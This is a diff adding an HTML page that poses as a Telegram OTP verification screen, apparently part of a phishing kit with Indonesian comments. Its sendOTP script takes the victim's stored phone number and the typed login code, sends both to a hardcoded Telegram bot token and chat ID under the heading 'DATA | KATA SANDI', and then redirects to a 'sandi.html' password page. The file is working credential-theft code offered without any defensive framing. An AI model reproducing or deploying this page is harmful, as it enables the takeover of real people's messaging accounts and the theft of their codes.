@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OTP Verification</title>
+    <style>
+      /* ==== Base ==== */
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: url("rew.jpg") no-repeat center center fixed;
+        background-size: cover;
+      }
+
+      /* ==== Container ==== */
+      .container {
+        background-color: lab(100% 0.01 -0.01 / 0.321); /* transparan 70% */
+        width: 80%;
+        max-width: 400px;
+        border-radius: 15px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        padding: 30px;
+        text-align: center;
+        margin-top: 30px;
+        backdrop-filter: blur(8px); /* biar efek kaca buram */
+      }
+
+      /* ==== Image ==== */
+      .form-container img {
+        width: 100px;
+        height: auto;
+      }
+
+      /* ==== Text ==== */
+      h2 {
+        font-size: 20px;
+        margin: 0;
+      }
+
+      p {
+        font-size: 14px;
+        color: #fff;
+        margin: 0;
+      }
+
+      .resend {
+        margin-top: 10px;
+        font-size: 14px;
+        color: #007bff;
+        cursor: pointer;
+        transition: text-decoration 0.3s ease;
+      }
+      .resend:hover {
+        text-decoration: underline;
+      }
+
+      /* ==== OTP Inputs ==== */
+      .otp-inputs {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+      }
+
+      .otp-inputs input {
+        width: 50px;
+        height: 50px;
+        font-size: 22px;
+        text-align: center;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        outline: none;
+        transition: border-color 0.3s ease;
+      }
+
+      .otp-inputs input:focus {
+        border-color: #25d366;
+      }
+
+      /* ==== Button ==== */
+      .submit-button {
+        width: 65px;
+        height: 65px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 26px;
+        color: #fff;
+        background-color: #25d366;
+        border: none;
+        border-radius: 50%;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.25);
+        transition: background-color 0.3s ease;
+
+        /* tambahan */
+        margin: 20px auto 0; /* biar tombol turun ke bawah dengan jarak */
+      }
+
+      .submit-button:hover {
+        background-color: #1caa54;
+      }
+
+      .submit-button::before {
+        content: "\2192"; /* panah kanan */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <main>
+        <img src="monkey.png" alt="" style="width: 50%" />
+        <h2>Enter Code</h2>
+        <p>
+          We've sent the code OTP to the <strong>Telegram app</strong>
+          <br />
+          for your other device.
+        </p>
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+        </div>
+        <button class="submit-button" onclick="sendOTP()"></button>
+        <p class="resend">Didn't get the code?</p>
+      </main>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const inputs = document.querySelectorAll(".otp-inputs input");
+
+        inputs.forEach((input, index) => {
+          input.addEventListener("input", (e) => {
+            if (e.target.value && index < inputs.length - 1) {
+              inputs[index + 1].focus();
+            }
+          });
+
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && index > 0 && !e.target.value) {
+              inputs[index - 1].focus();
+            }
+          });
+        });
+      });
+
+      function sendOTP() {
+        const inputs = document.querySelectorAll(".otp-inputs input");
+        let otp = "";
+        inputs.forEach((input) => (otp += input.value));
+
+        const phoneNumber = localStorage.getItem("phoneNumber");
+        const telegramBotToken =
+          "8598329061:AAE-3VxORyUYkRGnhfwHjEQ7DQ69ziKZgt4";
+        const chatId = "5939111303";
+
+        const message = `
+  ────────────────
+  🔰 DATA | KATA SANDI 🔰
+  ────────────────
+  📱 No HP : \`${phoneNumber}\`
+  🔑 OTP   : ${otp}
+  ────────────────`;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown",
+          }),
+        }).then(() => {
+          localStorage.setItem("otp", otp);
+          window.location.href = "sandi.html";
+        });
+      }
+    </script>
+  </body>
+</html>
